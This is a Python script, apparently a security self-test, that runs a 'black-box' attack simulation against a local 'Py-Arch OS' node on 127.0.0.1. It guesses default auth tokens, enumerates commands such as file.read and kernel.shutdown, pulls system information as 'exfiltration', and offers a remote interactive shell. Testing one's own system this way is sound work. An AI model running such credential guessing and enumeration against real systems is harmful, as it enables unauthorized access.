import asyncio
import json
import time
import sys
import random

# Standard Message structure used by Py-Arch OS
class RemoteMessage:
    def __init__(self, sender_id, receiver_id, action, payload, auth_token):
        self.sender_id = sender_id
        self.receiver_id = receiver_id
        self.action = action
        self.payload = payload
        self.auth_token = auth_token
        self.timestamp = time.time()
        # Nonce is used to prevent replay attacks
        self.nonce = hash(f"{self.timestamp}-{sender_id}-{action}")

    def to_json(self):
        return json.dumps(self.__dict__)

async def send_command(host, port, action, payload, token):
    """
    Connects to a remote Py-Arch Node and executes a command.
    """
    try:
        reader, writer = await asyncio.open_connection(host, port)
        
        msg = RemoteMessage(
            sender_id="unknown_attacker",
            receiver_id="node_001", # Common default ID
            action=action,
            payload=payload,
            auth_token=token
        )
        
        writer.write(msg.to_json().encode())
        await writer.drain()
        
        data = await reader.read(16384)
        writer.close()
        await writer.wait_closed()
        
        if data:
            return json.loads(data.decode())
    except Exception:
        return None

async def run_discovery_hack(host, port):
    """
    Simulates a 'Black Box' attack where the attacker only knows the IP/Port.
    """
    print("\n" + "!"*60)
    print("PY-ARCH BLACK-BOX DISCOVERY ATTACK")
    print(f"Targeting: {host}:{port}")
    print("!"*60)

    # STEP 1: Interface Fuzzing (Protocol Discovery)
    print("\n[STEP 1] Probing IPC Protocol...")
    # Attempting to send a generic ping/info without a token to see error format
    probe = await send_command(host, port, "system.info", {}, "")
    if probe:
        print(f"-> Response Received! Server confirms it is alive.")
        print(f"-> Error fingerprint: {probe.get('error', 'No error field')}")
    else:
        print("-> No response. Port may be closed or filtered.")

    # STEP 2: Default Token Brute-Force (Credential Guessing)
    print("\n[STEP 2] Attempting Default Credential Stuffing...")
    common_tokens = ["admin", "root", "guest", "1234", "password", "admin_token_123"]
    found_token = None

    for token in common_tokens:
        print(f"   Trying token: '{token}'...")
        resp = await send_command(host, port, "system.echo", {"text": "ping"}, token)
        if resp and resp.get("status") == "success":
            print(f"   [!] SUCCESS: Found valid token: {token}")
            found_token = token
            break
    
    if not found_token:
        print("   [-] Failed to guess default tokens.")
        return

    # STEP 3: Capability Enumeration (What can I do?)
    print("\n[STEP 3] Enumerating Command Capabilities...")
    potential_actions = ["system.info", "file.read", "process.list", "kernel.shutdown"]
    for action in potential_actions:
        resp = await send_command(host, port, action, {}, found_token)
        status = resp.get("status") if resp else "timeout"
        print(f"   Action '{action}': {status}")

    # STEP 4: Information Exfiltration
    print("\n[STEP 4] Exfiltrating System Environment...")
    final_resp = await send_command(host, port, "system.info", {}, found_token)
    if final_resp and final_resp.get("status") == "success":
        print(f"-> HOST DATA RECOVERED: {json.dumps(final_resp['result'], indent=2)}")

    print("\n" + "!"*60)
    print("ATTACK COMPLETE")
    print("!"*60)

async def run_interactive_shell(host, port):
    """
    Provides a real-time interactive shell to communicate with the Py-Arch Node.
    """
    print("\n" + "="*60)
    print("PY-ARCH OS REMOTE INTERACTIVE SHELL")
    print("="*60)
    
    token = input("Enter Auth Token [admin_token_123]: ") or "admin_token_123"
    
    while True:
        try:
            user_input = input("pyarch@remote> ").strip()
            if not user_input or user_input.lower() in ['exit', 'quit']:
                break
            
            parts = user_input.split(' ', 1)
            action = parts[0]
            payload = {"text": parts[1]} if len(parts) > 1 else {}
            
            if action == "info": action = "system.info"
            if action == "echo": action = "system.echo"

            resp = await send_command(host, port, action, payload, token)
            if resp:
                print(f"[{resp.get('status', 'ERROR').upper()}] {resp.get('result', resp.get('error', 'No output'))}")
            else:
                print("[!] No response from Node.")
            
        except KeyboardInterrupt:
            break

async def main():
    TARGET_IP = "127.0.0.1" 
    TARGET_PORT = 8888
    
    if len(sys.argv) > 1 and sys.argv[1] == "--shell":
        await run_interactive_shell(TARGET_IP, TARGET_PORT)
    else:
        print("Starting Black-Box hacking simulation...")
        await run_discovery_hack(TARGET_IP, TARGET_PORT)

if __name__ == "__main__":
    asyncio.run(main())
